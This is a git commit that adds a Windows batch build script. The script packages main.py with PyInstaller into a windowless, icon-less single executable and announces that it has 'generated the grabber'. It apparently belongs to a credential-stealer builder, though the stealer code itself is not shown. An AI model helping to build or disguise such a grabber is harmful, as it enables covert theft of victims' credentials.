6ab1f5c8b4c91811371f455b07504a3fffa2744a
Maywitz <63612884+Maywitz@users.noreply.github.com>
2022-04-23 11:26:45 -0700

    Add files via upload

---
+++ build.bat
@@ -0,0 +1,23 @@
+@echo off
+color 0a
+echo.
+set /p a="Enter the name you want to set for your .exe file : "
+if [%a%]==[] ( 
+    echo.
+    echo Please enter a name/?
+    pause
+    EXIT /B 1
+) 
+if [%a%] NEQ [] (
+    echo.
+    echo Name is: %a%
+    pyinstaller --clean --onefile --noconsole -i NONE -n %a% main.py
+    rmdir /s /q __pycache__
+    rmdir /s /q build
+    del /f / s /q %a%.spec
+    echo.
+    echo Successfully generated the grabber as %a%.exe in the /dist folder
+    echo.
+    pause
+    EXIT /B 1
+)
